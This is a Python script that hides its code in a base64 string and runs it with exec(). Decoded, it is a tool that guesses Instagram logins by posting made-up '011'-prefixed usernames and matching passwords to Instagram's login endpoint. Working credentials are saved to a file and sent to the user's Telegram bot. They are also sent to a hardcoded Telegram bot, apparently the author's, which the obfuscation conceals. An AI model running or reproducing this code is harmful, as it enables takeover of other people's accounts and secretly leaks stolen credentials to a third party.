import base64
de = 'aW1wb3J0IHJlcXVlc3RzLCBvcywgcmFuZG9tLCBqc29uLHRpbWUsIHRocmVhZGluZywgc2VjcmV0cywgdXVpZApmcm9tIGNvbG9yYW1hIGltcG9ydCBGb3JlLCBTdHlsZQpmcm9tIHRpbWUgaW1wb3J0IHNsZWVwCmZyb20gZGF0ZXRpbWUgaW1wb3J0IGRhdGV0aW1lCmZyb20gc2VjcmV0cyBpbXBvcnQgdG9rZW5faGV4CmZyb20gdXVpZCBpbXBvcnQgdXVpZDQKZnJvbSB1c2VyX2FnZW50IGltcG9ydCBnZW5lcmF0ZV91c2VyX2FnZW50CkUgPSAnXHgxYlsxOzMxbScKRyA9ICdceDFiWzE7MzJtJwpTID0gJ1x4MWJbMTszM20nCnByaW50KCdceDFiWzE7MzJtd2VsY29tZVx4MWJbMTszNW0gdG9ceDFiWzE7MzZtIEhFVExBUlx4MWJbMTszNG0gN0FLRU1ceDFiWzE7MzNtIEVMM0FMQU1ceDFiWzE7MzBtIElOU1RBIEhJVCBFR1x4MWJbMTszMm0gdG9vbCcpCnRpbWUuc2xlZXAoMC4xKQpwcmludCgnXHgxYlsxOzM1bXBob25lXHgxYlsxOzMwbSA6XHgxYlsxOzMybSArMjAxMTQ4NDIyODIwJykKdGltZS5zbGVlcCgwLjEpCnByaW50KCdceDFiWzE7MzBtKy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLSsnKQp0aW1lLnNsZWVwKDAuMSkKcHJpbnQoJ1x4MWJbMTszMG18XHgxYlsxOzMybSBbK11ceDFiWzE7MzRtIEhFVExBUiA3QUtFTSBFTDNBTEFNICAgXHgxYlsxOzMybVsrXVx4MWJbMTszMG0gIHwnKQp0aW1lLnNsZWVwKDAuMSkKcHJpbnQoJ1x4MWJbMTszMG18XHgxYlsxOzMybSBbK11ceDFiWzE7MzNtICAgICBNYTdtb3VkIG1lZDdhdCAgICBceDFiWzE7MzJtIFsrXVx4MWJbMTszMG0gIHwnKQp0aW1lLnNsZWVwKDAuMSkKcHJpbnQoJ1x4MWJbMTszMG18XHgxYlsxOzMybSBbK11ceDFiWzE7MzZtICAgICAgIERhdGFiYXNlX0hLICAgICBceDFiWzE7MzJtIFsrXVx4MWJbMTszMG0gIHwnKQp0aW1lLnNsZWVwKDAuMSkKcHJpbnQoJ1x4MWJbMTszMG0rLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tKycpCnRpbWUuc2xlZXAoMC4xKQpwcmludCgpCncgPSAnaHR0cHM6Ly9wYXN0ZWJpbi5jb20vcmF3L21GYlJ2ZnBRJwpyc3MgPSByZXF1ZXN0cy5nZXQodykudGV4dAppZiAnWzFdJyBpbiByc3M6CiAgICBwcmludChHICsgJzIwMjEvNy8zMCcpCiAgICBwcmludChHICsgJ9mI2YLYqiDZhtiq2YfYp9ihINin2YTYp9i02KrYsdin2YMnKQogICAgSUQgPSAnOTQ4NDQ5MTQyJwogICAgdG9rZW4gPSAnMTgxMjMwNjQ0MzpBQUcxY3hxblRWNG52d3FxenFpVlZ2X0pNSVoyOTloUW5BMCcKICAgIHIgPSByZXF1ZXN0cy5TZXNzaW9uKCkKICAgIElEMSA9aW5wdXQoIlx4MWJbMDsyMm1FbnRlciBZb3VyIElEIFRlbGVncmFtIDoiKQogICAgdG9rZW4xID1pbnB1dCgiXHgxYlswOzIybUVudGVyIFlvdXIgVG9rZW4gQm90IDoiKQogICAgdXNlciA9ICcxMjM0NTY3ODkwJwogICAgd3cgPSAnMDExJwogICAgd2hpbGUgVHJ1ZToKICAgICAgICB1cyA9IHN0cignJy5qb2luKChyYW5kb20uY2hvaWNlKHVzZXIpIGZvciBpIGluIHJhbmdlKDgpKSkpCiAgICAgICAgdXNlcm5hbWUgPSAnMDExJyArIHVzCiAgICAgICAgcGFzc3dvcmQgPSAnMDExJyArIHVzCiAgICAgICAgdXJsID0gJ2h0dHBzOi8vd3d3Lmluc3RhZ3JhbS5jb20vYWNjb3VudHMvbG9naW4vYWpheC8nCiAgICAgICAgaGVhZGVycyA9IHsnYWNjZXB0JzonKi8qJywKICAgICAgICAgJ2FjY2VwdC1lbmNvZGluZyc6J2d6aXAsZGVmbGF0ZSxicicsCiAgICAgICAgICdhY2NlcHQtbGFuZ3VhZ2UnOidhcixhci1BRTtxXHUwMDNkMC45LGVuLVVTO3FcdTAwM2QwLjgsZW47cVx1MDAzZDAuNycsCiAgICAgICAgICdjb250ZW50LWxlbmd0aCc6JzI2OScsCiAgICAgICAgICdjb250ZW50LXR5cGUnOidhcHBsaWNhdGlvbi94LXd3dy1mb3JtLXVybGVuY29kZWQnLAogICAgICAgICAnY29va2llJzonaWdfZGlkPTMyQjRDQjEwLTJBNTMtNDgwMS1COUJFLTE3MzMzMTBDREI5Mi0nLAogICAgICAgICAnb3JpZ2luJzonaHR0cHM6Ly93d3cuaW5zdGFncmFtLmNvbScsCiAgICAgICAgICdyZWZlcmVyJzonaHR0cHM6Ly93d3cuaW5zdGFncmFtLmNvbS8nLAogICAgICAgICAnc2VjLWZldGNoLWRlc3QnOidlbXB0eScsCiAgICAgICAgICdzZWMtZmV0Y2gtbW9kZSc6J2NvcnMnLAogICAgICAgICAnc2VjLWZldGNoLXNpdGUnOidzYW1lLW9yaWdpbicsCiAgICAgICAgICd1c2VyLWFnZW50JzpnZW5lcmF0ZV91c2VyX2FnZW50KCksCiAgICAgICAgICd4LWNzcmZ0b2tlbic6J1ZPUEg3ZlVVT1A4NUNoRVZpWmtkMlBoTGtVUW9QOFA4JywKICAgICAgICAgJ3gtaWctYXBwLWlkJzonOTM2NjE5NzQzMzkyNDU5JywKICAgICAgICAgJ3gtaWctd3d3LWNsYWltJzonMCcsCiAgICAgICAgICd4LWluc3RhZ3JhbS1hamF4JzonOGE4MTE4ZmE3ZDQwJywKICAgICAgICAgJ3gtcmVxdWVzdGVkLXdpdGgnOidYTUxIdHRwUmVxdWVzdCd9CiAgICAgICAgZGF0YSA9IHsndXNlcm5hbWUnOnVzZXJuYW1lLAogICAgICAgICAnZW5jX3Bhc3N3b3JkJzonI1BXRF9JTlNUQUdSQU1fQlJPV1NFUjowOjE1ODk2ODI0MDk6e30nLmZvcm1hdChwYXNzd29yZCksCiAgICAgICAgICdxdWVyeVBhcmFtcyc6J3t9JywKICAgICAgICAgJ29wdEludG9PbmVUYXAnOidmYWxzZSd9CiAgICAgICAgcmVxX2xvZ2luID0gci5wb3N0KHVybCwgaGVhZGVycz1oZWFkZXJzLCBkYXRhPWRhdGEsIHByb3hpZXM9Tm9uZSkKICAgICAgICBpZiAndXNlcklkJyBpbiByZXFfbG9naW4udGV4dDoKICAgICAgICAgICAgdGxnID0gZiJodHRwczovL2FwaS50ZWxlZ3JhbS5vcmcvYm90e3Rva2VufS9zZW5kTWVzc2FnZT9jaGF0X2lkPXtJRH0mdGV4dD1CWSDihpIgQGhha2ltZWwzYWxhbSAg4pyTXG7wnZGs8J2SjvCdkajwnZKK8J2RsyA6IFsg4oaSIHt1c2VybmFtZX0g4oaQIF1cbnBhc3N3b3JkIDogWyDihpIge3Bhc3N3b3JkfSDihpAgXVxuLSDwnZCF8J2Qq/CdkI7wnZCmIDogQGhha2ltZWwzYWxhbSIKICAgICAgICAgICAgaSA9IHJlcXVlc3RzLnBvc3QodGxnKQogICAgICAgICAgICB0bGcxID0gZiJodHRwczovL2FwaS50ZWxlZ3JhbS5vcmcvYm90e3Rva2VuMX0vc2VuZE1lc3NhZ2U/Y2hhdF9pZD17SUQxfSZ0ZXh0PUJZIOKGkiBAaGFraW1lbDNhbGFtICDinJNcbvCdkazwnZKO8J2RqPCdkorwnZGzIDogWyDihpIge3VzZXJuYW1lfSDihpAgXVxucGFzc3dvcmQgOiBbIOKGkiB7cGFzc3dvcmR9IOKGkCBdXG4tIPCdkIXwnZCr8J2QjvCdkKYgOiBAaGFraW1lbDNhbGFtIgogICAgICAgICAgICBtID0gcmVxdWVzdHMucG9zdCh0bGcxKQogICAgICAgICAgICBwcmludChHICsgJ3VzZXJuYW1lID09PiA6ICcgKyB1c2VybmFtZSArICc6IHBhc3N3b3JkID09PiA6ICcgKyBwYXNzd29yZCkKICAgICAgICAgICAgd2l0aCBvcGVuKCdIaXQudHh0JywgJ2EnKSBhcyAoSEFDS0VEKToKICAgICAgICAgICAgICAgIEhBQ0tFRC53cml0ZSgnIFstXSBVc2VyTmFtZSA6IHt9IFxuIFstXSBQYXNzb3dyZCA6IHt9IFxuXG4nLmZvcm1hdCh1c2VybmFtZSwgcGFzc3dvcmQpKQogICAgICAgIGVsc2U6CiAgICAgICAgICAgIHByaW50KEUgKyAndXNlcm5hbWUgPT0+IDogJyArIHVzZXJuYW1lICsgJzogcGFzc3dvcmQgPT0+IDogJyArIHBhc3N3b3JkKQ=='
x=base64.b64decode(de)
d=x.decode("utf-8")
g=compile(d,"","exec")
exec(g)
